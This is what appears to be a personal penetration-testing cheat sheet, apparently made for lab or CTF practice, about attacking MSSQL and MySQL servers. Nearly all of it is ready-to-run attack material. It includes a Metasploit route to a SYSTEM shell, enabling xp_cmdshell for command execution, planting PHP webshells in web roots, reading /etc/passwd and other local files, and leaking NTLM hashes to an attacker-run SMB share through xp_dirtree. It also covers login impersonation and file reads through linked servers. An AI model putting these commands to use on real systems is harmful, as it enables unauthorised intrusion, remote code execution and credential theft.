
connecting to [[mySQL]]
connecting to [[MSSQL]] using sqlcmd

# Easy way to get system access
msfconsole -> use mssql_payload 
put in LHOST, RHOSTS, Username, Password and run. 
User must be sql admin tho
once meterpreter shel is there use `getsystem`


# Execute Commands

## MSSQL
xp_cmdshell -> allow us to execute system commands using SQL (but disabled by default)

enabling xp_cmdshell (if we have the appriopriate privileges)
```
EXECUTE sp_configure 'show advanced options', 1
go

RECONFIGURE
go

EXECUTE sp_configure 'xp_cmdshell', 1
go

RECONFIGURE
go
```

sqlcmd
```
xp_cmdshell 'whoami \priv'
go
```
create revshell (in powershell base64) and then execute it 


## writing files in mssql 
```cmd-session
1> sp_configure 'show advanced options', 1
2> go
3> RECONFIGURE
4> go
5> sp_configure 'Ole Automation Procedures', 1
6> go
7> RECONFIGURE
8> go
```

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> go
```

## reading local files 
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> go
```

## Mysql 
write local files 
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
rmb to check the website to find what web root it is 

Privilege needed:
`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.
```
show variables like "secure_file_priv";
```

reading local files 
```shell-session
select LOAD_FILE("/etc/passwd");
```

# MSSQL Hash Stealing
First we need to start responder [[3 - Hacking/3.12 Attack Services/SMB|SMB]] or impacket-smbserver [[SMB Server]] to pretend to be a smb server and then connect to it to steal the hash

```
1> EXEC master..xp_dirtree '\\10.10.14.58\share\'
2> go

1> EXEC master..xp_subdirs '\\10.10.14.58\share\'
2> go
```
we can crack the hash using [[Hashcat]] (-m 5600, -a 0) or we can [[Pass the Hash (PtH)]]

# Impersonate Existing Users with MSSQL 
run these commands in master DB using `USE master`
Identify Users that we can impersonate
```cmd-session
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';



1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> go
```

Verifying our current user and role
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Impersonating
```cmd-session
1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go
```
we can use `REVERT` to go back to being the previous user

# Communicate with other databases with mssql 
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> go

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
```
1 -> remote server
0 -> linked server

we can pass EXECUTE statements to linked servers
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]

```

Opening file at linked server
```
EXECUTE('SELECT * from OPENROWSET(BULK 
''C:\Users\Administrator\Desktop\flag.txt'', SINGLE_CLOB) AS Contents') at [LOCAL.TEST.LINKED.SRV]

```